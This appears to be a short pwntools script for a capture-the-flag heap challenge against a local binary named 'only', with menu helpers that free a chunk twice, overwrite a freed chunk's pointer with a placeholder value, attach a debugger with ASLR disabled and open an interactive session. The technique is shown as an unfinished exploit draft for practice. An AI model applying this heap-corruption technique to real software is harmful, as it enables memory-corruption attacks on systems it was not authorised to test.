from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(['./only'], aslr=False)
elf = ELF('./only')

def initial(size: int = 0, init: bool = False):
    sh.sendlineafter(b"Choice >> ", b'0')
    if init:
        sh.sendlineafter(b"Size:", str(size).encode())


def increase(size: int, content: bytes):
    sh.sendlineafter(b"Choice >> ", b'1')
    sh.sendlineafter(b"Size:", str(size).encode())
    sh.sendafter(b"Content:", content)

def decrease():
    sh.sendlineafter(b"Choice >> ", b'2')


increase(0x78, b'B'*0x78)
decrease()
initial()
decrease()

increase(0x78, p64(0xdeadbeef) + b'\n')
increase(0x78, b'\n')
gdb.attach(sh, f'b *{0x169E + 0x555555554000}')
pause()
increase(0x78, b'AAAA' + b'\n')
sh.interactive()